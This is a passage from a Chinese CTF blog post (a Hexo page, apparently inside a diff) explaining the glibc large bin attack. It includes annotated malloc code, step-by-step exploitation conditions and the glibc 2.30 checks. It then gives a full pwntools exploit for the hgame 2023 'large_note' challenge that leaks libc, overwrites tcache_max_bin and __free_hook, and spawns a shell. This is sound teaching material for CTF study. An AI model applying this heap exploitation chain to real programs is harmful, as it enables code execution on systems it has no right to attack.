class="hljs-comment">//chunk2-&gt;bk_nextsize=chunk3</span><br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//chunk3-&gt;bk_nextsize	-&gt;fd_nextsize	=</span><br><span class="hljs-comment">//(target2-0x20)		-&gt;fd_nextsize	=chunk3</span><br><span class="hljs-comment">//target2								=chunk3</span><br>bck = fwd-&gt;bk;<br><span class="hljs-comment">//bck=chunk2-&gt;bk=target1-0x10</span><br><br>……<br><br>mark_bin (av, victim_index);<br>victim-&gt;bk = bck;<br><span class="hljs-comment">//chunk3-&gt;bk=target1-0x10</span><br>victim-&gt;fd = fwd;<br><span class="hljs-comment">//chunk3-&gt;fd=chunk2</span><br>fwd-&gt;bk = victim;<br><span class="hljs-comment">//chunk2-&gt;bk=chunk3</span><br>bck-&gt;fd = victim;<br><span class="hljs-comment">//(target1-0x10)-&gt;fd=chunk3</span><br><span class="hljs-comment">//target1=chunk3</span><br></code></pre></td></tr></table></figure></li>
+<li>更改成功<br>ps：示意图如下：<img src="/2023/01/25/large-bin-attack/%E6%9B%B4%E6%94%B9%E5%89%8D.jpg" srcset="/img/loading.gif" lazyload class title="更改前">
+<img src="/2023/01/25/large-bin-attack/%E6%9B%B4%E6%94%B9%E5%90%8E.jpg" srcset="/img/loading.gif" lazyload class title="更改后">
+<img src="/2023/01/25/large-bin-attack/1-1.jpg" srcset="/img/loading.gif" lazyload class title="2步骤一">
+<img src="/2023/01/25/large-bin-attack/1-2.jpg" srcset="/img/loading.gif" lazyload class title="2步骤二">
+<img src="/2023/01/25/large-bin-attack/1-3.jpg" srcset="/img/loading.gif" lazyload class title="2步骤三">
+<img src="/2023/01/25/large-bin-attack/1-4.jpg" srcset="/img/loading.gif" lazyload class title="2步骤四"></li>
+</ul>
+<h3 id="利用步骤-1"><a href="#利用步骤-1" class="headerlink" title="利用步骤"></a>利用步骤</h3><ul>
+<li>malloc一个size1的chunk（chunk1）</li>
+<li>malloc随便一个chunk防止合并</li>
+<li>malloc一个size2的chunk（chunk2），要求size1&lt;size2</li>
+<li>malloc随便一个chunk防止合并</li>
+<li>malloc一个size3的chunk（chunk3），要求size2&lt;size3且在一个large bin的范围内</li>
+<li>malloc随便一个chunk防止合并</li>
+<li>free掉chunk1和chunk2</li>
+<li>malloc一个size4的chunk，要求size1-size4属于small bin</li>
+<li>free掉chunk3</li>
+<li>修改chunk2如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">chunk2<br>size		-&gt; size2<br>fd			-&gt; null<br>bk			-&gt; target1<span class="hljs-number">-0x10</span><br>fd_nextsize	-&gt; null<br>bk_nextsize	-&gt; target2<span class="hljs-number">-0x20</span><br></code></pre></td></tr></table></figure></li>
+<li>随便malloc一个chunk，size&lt;size1-size4，触发large bin attack</li>
+</ul>
+<h2 id="2-30以后"><a href="#2-30以后" class="headerlink" title="2.30以后"></a>2.30以后</h2><p>增加检查</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<br>	malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);<br><br>	……<br><br><span class="hljs-keyword">if</span> (bck-&gt;fd != fwd)<br>	malloc_printerr (<span class="hljs-string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);<br></code></pre></td></tr></table></figure>
+<p>利用二不成立了，只能使用利用一</p>
+<h1 id="例题hgame-2023-week3-large-note"><a href="#例题hgame-2023-week3-large-note" class="headerlink" title="例题hgame 2023 week3 large_note"></a>例题hgame 2023 week3 large_note</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>看到这个名字第一反应就是large bin attack，但参见上文↑，我一直觉得这个漏洞很鸡肋不知道怎么用。直到我半夜搜到👉<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33590156/article/details/121716696">这个</a>👈<br>这道题最大的问题就是申请的chunk过大不在tcache的范围内，不能uaf。但large bin attack可以在tcache_max_bin处写下大至，使得更大的chunk能够放进tcache就可以uaf了（tcache_max_bin在mp_+80的地方，本身值为0x40），具体操作见上<br>之后步骤同safe_note</p>
+<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content: &#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pack</span>(<span class="hljs-params">pos, ptr</span>):<br>    <span class="hljs-keyword">return</span> (pos &gt;&gt; <span class="hljs-number">12</span>) ^ ptr<br><br><span class="hljs-comment">#p=process(&#x27;./large&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;week-3.hgame.lwsec.cn&#x27;</span>,<span class="hljs-number">30719</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./2.32-0ubuntu3.2_amd64/libc-2.32.so&#x27;</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x500</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-<span class="hljs-number">0x70</span>-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x61</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>tcache_max_bin=libcbase+<span class="hljs-number">0x1e3280</span>+<span class="hljs-number">80</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(tcache_max_bin))<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">0</span>)<br>pad1=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pad1))<br>edit(<span class="hljs-number">0</span>,p64(pad1)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x10</span>+p64(tcache_max_bin-<span class="hljs-number">0x20</span>))<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x600</span>)<br>delete(<span class="hljs-number">5</span>)<br>show(<span class="hljs-number">5</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>heap=(u64(s)&lt;&lt;<span class="hljs-number">12</span>)-<span class="hljs-number">0x1000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br>free_hook=libcbase+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x610</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x610</span>)<br>delete(<span class="hljs-number">7</span>)<br>delete(<span class="hljs-number">6</span>)<br>edit(<span class="hljs-number">6</span>,p64(pack(heap+<span class="hljs-number">0x2930</span>,free_hook)))<br>add(<span class="hljs-number">8</span>,<span class="hljs-number">0x610</span>)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>add(<span class="hljs-number">9</span>,<span class="hljs-number">0x610</span>)<br>edit(<span class="hljs-number">9</span>,p64(system_addr))<br>delete(<span class="hljs-number">8</span>)<br>p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/" class="category-chain-item">Pwn</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Pwn/Heap/" class="category-chain-item">Heap</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/how2heap/" class="print-no-link">#how2heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>large bin attack</div>
+      <div>http://akaieurus.github.io/2023/01/25/large-bin-attack/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/01/27/%E5%A0%86orw/" title="堆orw">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">堆orw</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/25/safe-linking/" title="safe-linking">
+                        <span class="hidden-mobile">safe-linking</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
